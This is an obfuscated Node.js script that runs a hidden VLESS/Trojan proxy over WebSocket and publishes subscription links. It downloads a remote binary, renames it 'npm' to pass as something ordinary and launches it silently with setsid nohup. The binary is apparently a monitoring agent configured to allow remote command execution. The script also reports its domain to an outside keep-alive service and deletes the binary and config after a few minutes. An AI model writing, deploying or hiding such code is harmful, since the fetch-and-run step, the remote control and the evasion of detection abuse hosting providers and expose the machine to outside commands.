const _0xe9f2c3=_0x4fcc;(function(_0x43ffb1,_0x45c66d){const _0x3ed8fb=_0x4fcc,_0x140ec8=_0x43ffb1();while(!![]){try{const _0x15614a=-parseInt(_0x3ed8fb(0x1e9))/0x1+parseInt(_0x3ed8fb(0x240))/0x2*(-parseInt(_0x3ed8fb(0x1e6))/0x3)+parseInt(_0x3ed8fb(0x24a))/0x4+-parseInt(_0x3ed8fb(0x210))/0x5+-parseInt(_0x3ed8fb(0x22c))/0x6*(parseInt(_0x3ed8fb(0x204))/0x7)+parseInt(_0x3ed8fb(0x223))/0x8+parseInt(_0x3ed8fb(0x232))/0x9;if(_0x15614a===_0x45c66d)break;else _0x140ec8['push'](_0x140ec8['shift']());}catch(_0x370fd5){_0x140ec8['push'](_0x140ec8['shift']());}}}(_0x5a88,0x8d00c));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0xe9f2c3(0x247)),net=require('net'),path=require(_0xe9f2c3(0x202)),crypto=require('crypto'),{Buffer}=require(_0xe9f2c3(0x221)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xe9f2c3(0x244)][_0xe9f2c3(0x213)]||'023aa6ec-9cdf-4bd8-9a20-12a9c3714c84',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0xe9f2c3(0x244)][_0xe9f2c3(0x20b)]||'',NEZHA_KEY=process[_0xe9f2c3(0x244)][_0xe9f2c3(0x225)]||'',DOMAIN=process['env'][_0xe9f2c3(0x227)]||_0xe9f2c3(0x1ec),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0xe9f2c3(0x244)][_0xe9f2c3(0x255)]||UUID[_0xe9f2c3(0x207)](0x0,0x8),SUB_PATH=process['env'][_0xe9f2c3(0x24c)]||_0xe9f2c3(0x1f4),NAME=process[_0xe9f2c3(0x244)]['NAME']||'',PORT=process['env']['PORT']||0x1eb4;function _0x4fcc(_0x4db3a8,_0x3d0d3e){_0x4db3a8=_0x4db3a8-0x1e5;const _0x5a88ca=_0x5a88();let _0x4fcc77=_0x5a88ca[_0x4db3a8];return _0x4fcc77;}let ISP='';const GetISP=async()=>{const _0x5cf5ca=_0xe9f2c3;try{const _0x17de1a=await axios[_0x5cf5ca(0x229)](_0x5cf5ca(0x252)),_0x4a2980=_0x17de1a[_0x5cf5ca(0x249)];ISP=(_0x4a2980['country_code']+'-'+_0x4a2980[_0x5cf5ca(0x257)])['replace'](/ /g,'_');}catch(_0x3abb29){ISP=_0x5cf5ca(0x23d);}};function _0x5a88(){const _0x2e3401=['concat','every','utf-8','8.8.4.4','Not\x20Found\x0a','replace','error','npm\x20is\x20running','arm','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','trojan://','path','client_secret:\x20','98blujpe','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','map','slice','2087','createServer','toString','NEZHA_PORT','\x20-p\x20','digest','false','write','3169975bigAJA','url','end','UUID','8443','pipe','https://oooo.serv00.net/add-url','https://amd64.ssss.nyc.mn/agent','aarch64','npm\x20running\x20error:','true','writeFileSync','readUInt16BE','length','1.1.1.1','unlink',':443?security=tls&sni=','buffer','vless://','5019208vhhpfJ','reduce','NEZHA_KEY','config.yaml','DOMAIN','readUInt8','get','text/html','npm','238218JMRoSB','application/dns-json','https://dns.google/resolve?name=','connect','index.html','npm\x20download\x20successfully','10571832AQVZyE','npm\x20is\x20already\x20running,\x20skip\x20running...','pop','/bin/bash','\x20with\x20all\x20DNS\x20servers','includes','&type=A','send','setsid\x20nohup\x20./npm\x20-s\x20','&path=%2F','readFile','Unknown','Hello\x20world!','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','582776pSMjHf','error:\x20','Answer','log','env','test','listen','axios','--tls','data','3740688ecIUFU','Failed\x20to\x20resolve\x20','SUB_PATH','Status','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','hex','update','message','https://api.ip.sb/geoip',':443?encryption=none&security=tls&sni=','2096','WSPATH','find','isp','substr','join','then','Server\x20is\x20running\x20on\x20port\x20','3oUYYea','https://arm64.ssss.nyc.mn/agent','from','678448fZeynH','catch','type','1234.abc.com','base64','&fp=chrome&type=ws&host=','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','writeHead','decode','Server','443','sub','https://','connection'];_0x5a88=function(){return _0x2e3401;};return _0x5a88();}GetISP();const httpServer=http[_0xe9f2c3(0x209)]((_0x2d820d,_0x5a591e)=>{const _0x5afd84=_0xe9f2c3;if(_0x2d820d['url']==='/'){const _0x375c9c=path[_0x5afd84(0x259)](__dirname,_0x5afd84(0x230));fs[_0x5afd84(0x23c)](_0x375c9c,'utf8',(_0x17abce,_0x44883)=>{const _0x4b7276=_0x5afd84;if(_0x17abce){_0x5a591e['writeHead'](0xc8,{'Content-Type':_0x4b7276(0x22a)}),_0x5a591e[_0x4b7276(0x212)](_0x4b7276(0x23e));return;}_0x5a591e[_0x4b7276(0x1f0)](0xc8,{'Content-Type':_0x4b7276(0x22a)}),_0x5a591e['end'](_0x44883);});return;}else{if(_0x2d820d[_0x5afd84(0x211)]==='/'+SUB_PATH){const _0x472419=NAME?NAME+'-'+ISP:ISP,_0x37b7dc=_0x5afd84(0x222)+UUID+'@'+DOMAIN+_0x5afd84(0x253)+DOMAIN+_0x5afd84(0x1ee)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x472419,_0x4e6277=_0x5afd84(0x201)+UUID+'@'+DOMAIN+_0x5afd84(0x220)+DOMAIN+_0x5afd84(0x1ee)+DOMAIN+_0x5afd84(0x23b)+WSPATH+'#'+_0x472419,_0x5a5354=_0x37b7dc+'\x0a'+_0x4e6277,_0x31dd1f=Buffer[_0x5afd84(0x1e8)](_0x5a5354)['toString'](_0x5afd84(0x1ed));_0x5a591e[_0x5afd84(0x1f0)](0xc8,{'Content-Type':'text/plain'}),_0x5a591e[_0x5afd84(0x212)](_0x31dd1f+'\x0a');}else _0x5a591e[_0x5afd84(0x1f0)](0x194,{'Content-Type':'text/plain'}),_0x5a591e[_0x5afd84(0x212)](_0x5afd84(0x1fb));}}),wss=new WebSocket[(_0xe9f2c3(0x1f2))]({'server':httpServer}),uuid=UUID[_0xe9f2c3(0x1fc)](/-/g,''),DNS_SERVERS=[_0xe9f2c3(0x1fa),_0xe9f2c3(0x21e)];function resolveHost(_0x11b6f3){return new Promise((_0x34c303,_0x478d3a)=>{const _0x5a947d=_0x4fcc;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5a947d(0x245)](_0x11b6f3)){_0x34c303(_0x11b6f3);return;}let _0x5c8754=0x0;function _0x5e8d14(){const _0x3334e9=_0x5a947d;if(_0x5c8754>=DNS_SERVERS[_0x3334e9(0x21d)]){_0x478d3a(new Error(_0x3334e9(0x24b)+_0x11b6f3+_0x3334e9(0x236)));return;}const _0x996053=DNS_SERVERS[_0x5c8754];_0x5c8754++;const _0x4ded03=_0x3334e9(0x22e)+encodeURIComponent(_0x11b6f3)+_0x3334e9(0x238);axios[_0x3334e9(0x229)](_0x4ded03,{'timeout':0x1388,'headers':{'Accept':_0x3334e9(0x22d)}})[_0x3334e9(0x25a)](_0x108aa9=>{const _0x2d312b=_0x3334e9,_0x55f83c=_0x108aa9['data'];if(_0x55f83c[_0x2d312b(0x24d)]===0x0&&_0x55f83c[_0x2d312b(0x242)]&&_0x55f83c[_0x2d312b(0x242)][_0x2d312b(0x21d)]>0x0){const _0x2c94e7=_0x55f83c[_0x2d312b(0x242)][_0x2d312b(0x256)](_0x52f1ad=>_0x52f1ad[_0x2d312b(0x1eb)]===0x1);if(_0x2c94e7){_0x34c303(_0x2c94e7[_0x2d312b(0x249)]);return;}}_0x5e8d14();})[_0x3334e9(0x1ea)](_0x2bd70e=>{_0x5e8d14();});}_0x5e8d14();});}function handleVlessConnection(_0x3e95c8,_0x4f0dd5){const _0x50269e=_0xe9f2c3,[_0x2cbb66]=_0x4f0dd5,_0x20e282=_0x4f0dd5[_0x50269e(0x207)](0x1,0x11);if(!_0x20e282[_0x50269e(0x1f8)]((_0x52867b,_0x1871b8)=>_0x52867b==parseInt(uuid['substr'](_0x1871b8*0x2,0x2),0x10)))return![];let _0x2f23a4=_0x4f0dd5[_0x50269e(0x207)](0x11,0x12)[_0x50269e(0x228)]()+0x13;const _0x270bf8=_0x4f0dd5[_0x50269e(0x207)](_0x2f23a4,_0x2f23a4+=0x2)['readUInt16BE'](0x0),_0x39abd9=_0x4f0dd5[_0x50269e(0x207)](_0x2f23a4,_0x2f23a4+=0x1)[_0x50269e(0x228)](),_0x42b5f5=_0x39abd9==0x1?_0x4f0dd5[_0x50269e(0x207)](_0x2f23a4,_0x2f23a4+=0x4)['join']('.'):_0x39abd9==0x2?new TextDecoder()[_0x50269e(0x1f1)](_0x4f0dd5[_0x50269e(0x207)](_0x2f23a4+0x1,_0x2f23a4+=0x1+_0x4f0dd5[_0x50269e(0x207)](_0x2f23a4,_0x2f23a4+0x1)['readUInt8']())):_0x39abd9==0x3?_0x4f0dd5[_0x50269e(0x207)](_0x2f23a4,_0x2f23a4+=0x10)[_0x50269e(0x224)]((_0x119a13,_0x195349,_0x2cb9ce,_0x3a9784)=>_0x2cb9ce%0x2?_0x119a13[_0x50269e(0x1f7)](_0x3a9784['slice'](_0x2cb9ce-0x1,_0x2cb9ce+0x1)):_0x119a13,[])[_0x50269e(0x206)](_0xa62ba3=>_0xa62ba3[_0x50269e(0x21c)](0x0)[_0x50269e(0x20a)](0x10))[_0x50269e(0x259)](':'):'';_0x3e95c8[_0x50269e(0x239)](new Uint8Array([_0x2cbb66,0x0]));const _0x63070e=createWebSocketStream(_0x3e95c8);return resolveHost(_0x42b5f5)['then'](_0x37f94d=>{const _0x5796f2=_0x50269e;net[_0x5796f2(0x22f)]({'host':_0x37f94d,'port':_0x270bf8},function(){const _0x36857b=_0x5796f2;this['write'](_0x4f0dd5[_0x36857b(0x207)](_0x2f23a4)),_0x63070e['on']('error',()=>{})[_0x36857b(0x215)](this)['on'](_0x36857b(0x1fd),()=>{})[_0x36857b(0x215)](_0x63070e);})['on']('error',()=>{});})[_0x50269e(0x1ea)](_0x52fd83=>{const _0x2a75d9=_0x50269e;net[_0x2a75d9(0x22f)]({'host':_0x42b5f5,'port':_0x270bf8},function(){const _0x565ce6=_0x2a75d9;this[_0x565ce6(0x20f)](_0x4f0dd5[_0x565ce6(0x207)](_0x2f23a4)),_0x63070e['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x565ce6(0x215)](_0x63070e);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x1274b0,_0x4bbe55){const _0x427a60=_0xe9f2c3;try{if(_0x4bbe55[_0x427a60(0x21d)]<0x3a)return![];const _0x18085f=_0x4bbe55[_0x427a60(0x207)](0x0,0x38)[_0x427a60(0x20a)](),_0x4c16af=[UUID];let _0xf9c012=null;for(const _0x1baf92 of _0x4c16af){const _0x2c99fe=crypto['createHash']('sha224')[_0x427a60(0x250)](_0x1baf92)[_0x427a60(0x20d)](_0x427a60(0x24f));if(_0x2c99fe===_0x18085f){_0xf9c012=_0x1baf92;break;}}if(!_0xf9c012)return![];let _0x3014c7=0x38;_0x4bbe55[_0x3014c7]===0xd&&_0x4bbe55[_0x3014c7+0x1]===0xa&&(_0x3014c7+=0x2);const _0x36dc81=_0x4bbe55[_0x3014c7];if(_0x36dc81!==0x1)return![];_0x3014c7+=0x1;const _0x5bc01c=_0x4bbe55[_0x3014c7];_0x3014c7+=0x1;let _0x37cae0,_0x5e429b;if(_0x5bc01c===0x1)_0x37cae0=_0x4bbe55[_0x427a60(0x207)](_0x3014c7,_0x3014c7+0x4)[_0x427a60(0x259)]('.'),_0x3014c7+=0x4;else{if(_0x5bc01c===0x3){const _0x5100fa=_0x4bbe55[_0x3014c7];_0x3014c7+=0x1,_0x37cae0=_0x4bbe55[_0x427a60(0x207)](_0x3014c7,_0x3014c7+_0x5100fa)['toString'](),_0x3014c7+=_0x5100fa;}else{if(_0x5bc01c===0x4)_0x37cae0=_0x4bbe55[_0x427a60(0x207)](_0x3014c7,_0x3014c7+0x10)[_0x427a60(0x224)]((_0x4ba207,_0x18ff29,_0x5d6a83,_0x3b837a)=>_0x5d6a83%0x2?_0x4ba207[_0x427a60(0x1f7)](_0x3b837a[_0x427a60(0x207)](_0x5d6a83-0x1,_0x5d6a83+0x1)):_0x4ba207,[])[_0x427a60(0x206)](_0x1b7cec=>_0x1b7cec['readUInt16BE'](0x0)[_0x427a60(0x20a)](0x10))[_0x427a60(0x259)](':'),_0x3014c7+=0x10;else return![];}}_0x5e429b=_0x4bbe55[_0x427a60(0x21c)](_0x3014c7),_0x3014c7+=0x2;_0x3014c7<_0x4bbe55['length']&&_0x4bbe55[_0x3014c7]===0xd&&_0x4bbe55[_0x3014c7+0x1]===0xa&&(_0x3014c7+=0x2);const _0x5a0781=createWebSocketStream(_0x1274b0);return resolveHost(_0x37cae0)[_0x427a60(0x25a)](_0x85eee2=>{const _0x383cea=_0x427a60;net[_0x383cea(0x22f)]({'host':_0x85eee2,'port':_0x5e429b},function(){const _0x534a03=_0x383cea;_0x3014c7<_0x4bbe55[_0x534a03(0x21d)]&&this['write'](_0x4bbe55[_0x534a03(0x207)](_0x3014c7)),_0x5a0781['on'](_0x534a03(0x1fd),()=>{})[_0x534a03(0x215)](this)['on'](_0x534a03(0x1fd),()=>{})[_0x534a03(0x215)](_0x5a0781);})['on'](_0x383cea(0x1fd),()=>{});})[_0x427a60(0x1ea)](_0x5b173f=>{const _0x3e1ca8=_0x427a60;net[_0x3e1ca8(0x22f)]({'host':_0x37cae0,'port':_0x5e429b},function(){const _0x4ad4b6=_0x3e1ca8;_0x3014c7<_0x4bbe55['length']&&this[_0x4ad4b6(0x20f)](_0x4bbe55[_0x4ad4b6(0x207)](_0x3014c7)),_0x5a0781['on'](_0x4ad4b6(0x1fd),()=>{})['pipe'](this)['on'](_0x4ad4b6(0x1fd),()=>{})[_0x4ad4b6(0x215)](_0x5a0781);})['on'](_0x3e1ca8(0x1fd),()=>{});}),!![];}catch(_0x419662){return![];}}wss['on'](_0xe9f2c3(0x1f6),(_0x569614,_0x130ab4)=>{const _0x347514=_0xe9f2c3,_0x38a9c1=_0x130ab4[_0x347514(0x211)]||'';_0x569614['once'](_0x347514(0x251),_0x24f98c=>{const _0xdb6e55=_0x347514;if(_0x24f98c['length']>0x11&&_0x24f98c[0x0]===0x0){const _0x310572=_0x24f98c['slice'](0x1,0x11),_0x581398=_0x310572['every']((_0x2a7ef5,_0x2b8497)=>_0x2a7ef5==parseInt(uuid[_0xdb6e55(0x258)](_0x2b8497*0x2,0x2),0x10));if(_0x581398){!handleVlessConnection(_0x569614,_0x24f98c)&&_0x569614['close']();return;}}!handleTrojanConnection(_0x569614,_0x24f98c)&&_0x569614['close']();})['on'](_0x347514(0x1fd),()=>{});});const getDownloadUrl=()=>{const _0x25dcd7=_0xe9f2c3,_0x2781d3=os['arch']();return _0x2781d3===_0x25dcd7(0x1ff)||_0x2781d3==='arm64'||_0x2781d3===_0x25dcd7(0x218)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x25dcd7(0x1e7):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x25dcd7(0x217);},downloadFile=async()=>{const _0x575b5f=_0xe9f2c3;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4f77b5=getDownloadUrl(),_0x31a958=await axios({'method':_0x575b5f(0x229),'url':_0x4f77b5,'responseType':'stream'}),_0x368bc5=fs['createWriteStream'](_0x575b5f(0x22b));return _0x31a958[_0x575b5f(0x249)][_0x575b5f(0x215)](_0x368bc5),new Promise((_0x39f469,_0x393b5d)=>{const _0x5267d9=_0x575b5f;_0x368bc5['on']('finish',()=>{const _0x82a6fa=_0x4fcc;console[_0x82a6fa(0x243)](_0x82a6fa(0x231)),exec('chmod\x20+x\x20npm',_0x263fbc=>{if(_0x263fbc)_0x393b5d(_0x263fbc);_0x39f469();});}),_0x368bc5['on'](_0x5267d9(0x1fd),_0x393b5d);});}catch(_0x5ad5e3){throw _0x5ad5e3;}},runnz=async()=>{const _0x2b48de=_0xe9f2c3;try{const _0x1f84ed=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2b48de(0x1f9)});if(_0x1f84ed['trim']()!==''){console[_0x2b48de(0x243)](_0x2b48de(0x233));return;}}catch(_0x3e6e4a){}await downloadFile();let _0x146558='',_0x4b4917=[_0x2b48de(0x1f3),_0x2b48de(0x214),_0x2b48de(0x254),_0x2b48de(0x208),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4c147f=_0x4b4917[_0x2b48de(0x237)](NEZHA_PORT)?_0x2b48de(0x248):'';_0x146558=_0x2b48de(0x23a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2b48de(0x20c)+NEZHA_KEY+'\x20'+_0x4c147f+_0x2b48de(0x23f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x17c5f4=NEZHA_SERVER[_0x2b48de(0x237)](':')?NEZHA_SERVER['split'](':')[_0x2b48de(0x234)]():'',_0x20ea0e=_0x4b4917[_0x2b48de(0x237)](_0x17c5f4)?_0x2b48de(0x21a):_0x2b48de(0x20e),_0x1b3632=_0x2b48de(0x203)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2b48de(0x205)+_0x20ea0e+_0x2b48de(0x24e)+UUID;fs[_0x2b48de(0x21b)]('config.yaml',_0x1b3632);}_0x146558=_0x2b48de(0x1ef);}else{console[_0x2b48de(0x243)](_0x2b48de(0x200));return;}}try{exec(_0x146558,{'shell':_0x2b48de(0x235)},_0x6e32a9=>{const _0x460cd7=_0x2b48de;if(_0x6e32a9)console[_0x460cd7(0x1fd)](_0x460cd7(0x219),_0x6e32a9);else console[_0x460cd7(0x243)](_0x460cd7(0x1fe));});}catch(_0x15f17b){console[_0x2b48de(0x1fd)](_0x2b48de(0x241)+_0x15f17b);}};async function addAccessTask(){const _0x19c3ed=_0xe9f2c3;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x55eb66=_0x19c3ed(0x1f5)+DOMAIN;try{const _0x46c598=await axios['post'](_0x19c3ed(0x216),{'url':_0x55eb66},{'headers':{'Content-Type':'application/json'}});console[_0x19c3ed(0x243)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x3fc2ad){}}const delFiles=()=>{const _0x167e5c=_0xe9f2c3;fs[_0x167e5c(0x21f)](_0x167e5c(0x22b),()=>{}),fs[_0x167e5c(0x21f)](_0x167e5c(0x226),()=>{});};httpServer[_0xe9f2c3(0x246)](PORT,()=>{const _0x26b6e0=_0xe9f2c3;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x26b6e0(0x1e5)+PORT);});
